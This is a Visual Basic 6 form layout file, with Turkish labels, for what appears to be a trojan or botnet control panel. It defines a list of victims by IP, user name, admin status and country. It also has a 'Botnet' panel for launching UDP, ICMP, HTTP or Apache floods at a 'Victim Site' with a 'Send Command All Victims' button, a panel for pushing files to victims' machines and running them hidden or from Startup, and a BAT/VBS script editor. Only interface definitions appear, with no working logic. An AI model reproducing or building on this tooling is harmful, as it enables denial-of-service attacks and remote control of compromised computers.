VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmana 
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   4  'Fixed ToolWindow
   ClientHeight    =   9945
   ClientLeft      =   2805
   ClientTop       =   390
   ClientWidth     =   9855
   ControlBox      =   0   'False
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   162
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   9945
   ScaleWidth      =   9855
   ShowInTaskbar   =   0   'False
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      AutoRedraw      =   -1  'True
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   23
      Left            =   12720
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   353
      Top             =   8040
      Width           =   6735
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "UDP"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   0
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   365
         Top             =   1440
         Value           =   -1  'True
         Width           =   615
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "ICMP"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   364
         Top             =   1800
         Width           =   735
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "Apache"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   2
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   363
         Top             =   2160
         Width           =   855
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "HTTP"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   3
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   362
         Top             =   2520
         Width           =   735
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "STOP"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   4
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   361
         Top             =   2880
         Width           =   735
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "RESET"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   5
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   360
         Top             =   3240
         Width           =   855
      End
      Begin VB.OptionButton optbotnet 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         Caption         =   "END"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   6
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   359
         Top             =   3600
         Width           =   735
      End
      Begin VB.TextBox txtbotnet 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   0
         Left            =   720
         TabIndex        =   358
         Text            =   "http://www.site.com"
         Top             =   600
         Width           =   5775
      End
      Begin VB.TextBox txtbotnet 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   1
         Left            =   2400
         TabIndex        =   357
         Text            =   "25"
         Top             =   1440
         Width           =   855
      End
      Begin VB.TextBox txtbotnet 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   2
         Left            =   2400
         TabIndex        =   356
         Text            =   "20"
         Top             =   1920
         Width           =   855
      End
      Begin VB.TextBox txtbotnet 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   3
         Left            =   5640
         TabIndex        =   355
         Text            =   "20000"
         Top             =   1440
         Width           =   855
      End
      Begin VB.TextBox txtbotnet 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   4
         Left            =   5640
         TabIndex        =   354
         Text            =   "0.01"
         Top             =   1920
         Width           =   855
      End
      Begin Client.cmd btn 
         Height          =   375
         Index           =   135
         Left            =   3720
         TabIndex        =   375
         Top             =   2520
         Width           =   2895
         _ExtentX        =   5106
         _ExtentY        =   661
         BTYPE           =   3
         TX              =   "Send Command All Victims"
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":15162
         PICN            =   "Form1.frx":1547C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "Site : "
         Height          =   195
         Index           =   74
         Left            =   240
         TabIndex        =   374
         Top             =   600
         Width           =   420
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Port : "
         Height          =   195
         Index           =   73
         Left            =   1560
         TabIndex        =   373
         Top             =   1440
         Width           =   495
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Sockets : "
         Height          =   195
         Index           =   69
         Left            =   1560
         TabIndex        =   369
         Top             =   1920
         Width           =   750
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Packet Size : "
         Height          =   195
         Index           =   68
         Left            =   4560
         TabIndex        =   368
         Top             =   1440
         Width           =   1005
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Interval : "
         Height          =   195
         Index           =   67
         Left            =   4560
         TabIndex        =   367
         Top             =   1920
         Width           =   765
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Victim Site "
         Height          =   195
         Index           =   70
         Left            =   240
         TabIndex        =   370
         Top             =   360
         Width           =   810
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Commands "
         Height          =   195
         Index           =   71
         Left            =   240
         TabIndex        =   371
         Top             =   1080
         Width           =   870
      End
      Begin VB.Label lbl 
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Other Settings "
         Height          =   195
         Index           =   66
         Left            =   1560
         TabIndex        =   366
         Top             =   1080
         Width           =   1140
      End
      Begin VB.Shape Shape1 
         Height          =   1215
         Index           =   0
         Left            =   1440
         Top             =   1200
         Width           =   5175
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Botnet"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   72
         Left            =   0
         TabIndex        =   372
         Top             =   0
         Width           =   6735
      End
      Begin VB.Shape Shape1 
         Height          =   2775
         Index           =   1
         Left            =   120
         Top             =   1200
         Width           =   1215
      End
      Begin VB.Shape Shape1 
         Height          =   495
         Index           =   2
         Left            =   120
         Top             =   480
         Width           =   6495
      End
   End
   Begin MSComctlLib.ListView lvw 
      Height          =   2295
      Index           =   0
      Left            =   120
      TabIndex        =   2
      Top             =   6960
      Width           =   9375
      _ExtentX        =   16536
      _ExtentY        =   4048
      View            =   3
      Arrange         =   1
      SortOrder       =   -1  'True
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      GridLines       =   -1  'True
      PictureAlignment=   2
      _Version        =   393217
      Icons           =   "imgflags"
      SmallIcons      =   "imgflags"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   0
      MousePointer    =   99
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      NumItems        =   9
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Kurban'ýn Adý"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "IP Adresi"
         Object.Width           =   2117
      EndProperty
      BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   2
         Text            =   "Kullanýcý Adý"
         Object.Width           =   1940
      EndProperty
      BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   3
         Text            =   "Bilgisayar Adý"
         Object.Width           =   1940
      EndProperty
      BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   4
         Text            =   "Yönetici"
         Object.Width           =   1587
      EndProperty
      BeginProperty ColumnHeader(6) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   5
         Text            =   "Ýþletim Sistemi"
         Object.Width           =   1764
      EndProperty
      BeginProperty ColumnHeader(7) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   6
         Text            =   "Cpu"
         Object.Width           =   1411
      EndProperty
      BeginProperty ColumnHeader(8) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   7
         Text            =   "Ram"
         Object.Width           =   1411
      EndProperty
      BeginProperty ColumnHeader(9) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   8
         Text            =   "Ülke"
         Object.Width           =   1587
      EndProperty
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   22
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   326
      Top             =   7560
      Width           =   6735
      Begin VB.Frame frm 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BorderStyle     =   0  'None
         ForeColor       =   &H80000008&
         Height          =   2295
         Left            =   2400
         TabIndex        =   344
         Top             =   2760
         Width           =   3615
         Begin VB.OptionButton nasilcalissin 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Normal Focus"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   4
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   350
            Top             =   1800
            Width           =   1575
         End
         Begin VB.OptionButton nasilcalissin 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Minimized No Focus"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   3
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   349
            Top             =   1440
            Width           =   1695
         End
         Begin VB.OptionButton nasilcalissin 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Minimized Focus"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   2
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   348
            Top             =   1080
            Width           =   1575
         End
         Begin VB.OptionButton nasilcalissin 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Maximized Focus"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   1
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   347
            Top             =   720
            Width           =   1575
         End
         Begin VB.OptionButton nasilcalissin 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Hide"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   0
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   346
            Top             =   360
            Value           =   -1  'True
            Width           =   1575
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00FFFFFF&
            Caption         =   " Dosya Nasýl Çalýþsýn "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   65
            Left            =   120
            TabIndex        =   345
            Top             =   0
            Width           =   1485
         End
         Begin VB.Shape shp 
            Height          =   2175
            Index           =   20
            Left            =   0
            Top             =   120
            Width           =   3615
         End
      End
      Begin VB.CheckBox downloadexecute 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Yükleme tamamlandiktan sonra yüklenen dosya otomatik olarak çalýþtýrýlsýn"
         ForeColor       =   &H80000008&
         Height          =   375
         Left            =   120
         MousePointer    =   99  'Custom
         TabIndex        =   343
         Top             =   1320
         Width           =   5895
      End
      Begin VB.TextBox sitedenindir 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   1
         Left            =   3480
         TabIndex        =   342
         Top             =   2160
         Width           =   2415
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "App Path"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   7
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   339
         Top             =   4680
         Value           =   -1  'True
         Width           =   1095
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Program Files"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   6
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   338
         Top             =   4320
         Width           =   1335
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Startup"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   5
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   337
         Top             =   3960
         Width           =   1215
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Temp"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   4
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   336
         Top             =   2520
         Width           =   1215
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "System32"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   3
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   335
         Top             =   3600
         Width           =   1095
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "System"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   2
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   334
         Top             =   3240
         Width           =   1215
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Windows"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   1
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   333
         Top             =   2880
         Width           =   1215
      End
      Begin VB.OptionButton yuklemedizini 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Desktop"
         ForeColor       =   &H80000008&
         Height          =   195
         Index           =   0
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   332
         Top             =   2160
         Width           =   1215
      End
      Begin VB.TextBox sitedenindir 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   0
         Left            =   720
         TabIndex        =   330
         Top             =   720
         Width           =   5175
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   133
         Left            =   6120
         TabIndex        =   351
         Top             =   480
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":1597E
         PICN            =   "Form1.frx":15C98
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   134
         Left            =   6120
         TabIndex        =   352
         Top             =   1080
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":15FEA
         PICN            =   "Form1.frx":16304
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "Dosya Adý :"
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   64
         Left            =   2520
         TabIndex        =   341
         Top             =   2160
         Width           =   825
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Dosya Adý "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   63
         Left            =   2520
         TabIndex        =   340
         Top             =   1800
         Width           =   810
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   19
         Left            =   2400
         Top             =   1920
         Width           =   3615
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "Dosya Nereye Ýndirilecek"
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   62
         Left            =   240
         TabIndex        =   331
         Top             =   1800
         Width           =   1785
      End
      Begin VB.Shape shp 
         Height          =   3135
         Index           =   18
         Left            =   120
         Top             =   1920
         Width           =   2175
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   "URL : "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   61
         Left            =   240
         TabIndex        =   329
         Top             =   720
         Width           =   435
      End
      Begin VB.Label lbl 
         Appearance      =   0  'Flat
         AutoSize        =   -1  'True
         BackColor       =   &H00FFFFFF&
         Caption         =   " Dosya Ayarlari "
         ForeColor       =   &H00000000&
         Height          =   195
         Index           =   60
         Left            =   240
         TabIndex        =   328
         Top             =   360
         Width           =   1140
      End
      Begin VB.Shape shp 
         Height          =   735
         Index           =   17
         Left            =   120
         Top             =   480
         Width           =   5895
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Karþý Bilgisayara Siteden Dosya Yükleme"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   59
         Left            =   0
         TabIndex        =   327
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   21
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   318
      Top             =   7200
      Width           =   6735
      Begin VB.OptionButton scriptipi 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "BAT"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   5280
         MousePointer    =   99  'Custom
         TabIndex        =   323
         Top             =   480
         Value           =   -1  'True
         Width           =   615
      End
      Begin VB.OptionButton scriptipi 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "VBS"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   0
         Left            =   240
         MousePointer    =   99  'Custom
         TabIndex        =   322
         Top             =   480
         Width           =   615
      End
      Begin VB.TextBox scriptcode 
         Appearance      =   0  'Flat
         Height          =   4095
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   321
         Top             =   840
         Width           =   5655
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   130
         Left            =   6120
         TabIndex        =   319
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":16656
         PICN            =   "Form1.frx":16970
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   131
         Left            =   6120
         TabIndex        =   324
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":16D22
         PICN            =   "Form1.frx":1703C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   132
         Left            =   6120
         TabIndex        =   325
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":17436
         PICN            =   "Form1.frx":17750
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Shape shp 
         Height          =   4695
         Index           =   16
         Left            =   120
         Top             =   360
         Width           =   5895
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "BAT Script VBS Script Editor"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   58
         Left            =   0
         TabIndex        =   320
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.ListBox dil 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   3180
      Left            =   9960
      TabIndex        =   299
      Top             =   6240
      Width           =   2175
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   20
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   303
      Top             =   6840
      Width           =   6735
      Begin VB.CheckBox chcprinter 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Üstü Çizili"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   3
         Left            =   3960
         MousePointer    =   99  'Custom
         TabIndex        =   315
         Top             =   720
         Width           =   1095
      End
      Begin VB.CheckBox chcprinter 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Italic"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   2
         Left            =   3240
         MousePointer    =   99  'Custom
         TabIndex        =   313
         Top             =   720
         Width           =   735
      End
      Begin VB.CheckBox chcprinter 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Altý Çizili"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   1
         Left            =   2280
         MousePointer    =   99  'Custom
         TabIndex        =   312
         Top             =   720
         Width           =   975
      End
      Begin VB.CheckBox chcprinter 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Kalýn"
         ForeColor       =   &H80000008&
         Height          =   255
         Index           =   0
         Left            =   1440
         MousePointer    =   99  'Custom
         TabIndex        =   311
         Top             =   720
         Width           =   735
      End
      Begin VB.TextBox txtprinter 
         Appearance      =   0  'Flat
         Height          =   285
         Index           =   1
         Left            =   840
         TabIndex        =   309
         Text            =   "20"
         Top             =   720
         Width           =   495
      End
      Begin VB.TextBox txtprinter 
         Appearance      =   0  'Flat
         Height          =   3375
         Index           =   0
         Left            =   240
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   308
         Text            =   "Form1.frx":17AA2
         Top             =   1560
         Width           =   6255
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   128
         Left            =   5400
         TabIndex        =   304
         ToolTipText     =   "metni temizle"
         Top             =   600
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":17AC6
         PICN            =   "Form1.frx":17DE0
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   129
         Left            =   6000
         TabIndex        =   314
         ToolTipText     =   "metni yazdir"
         Top             =   600
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
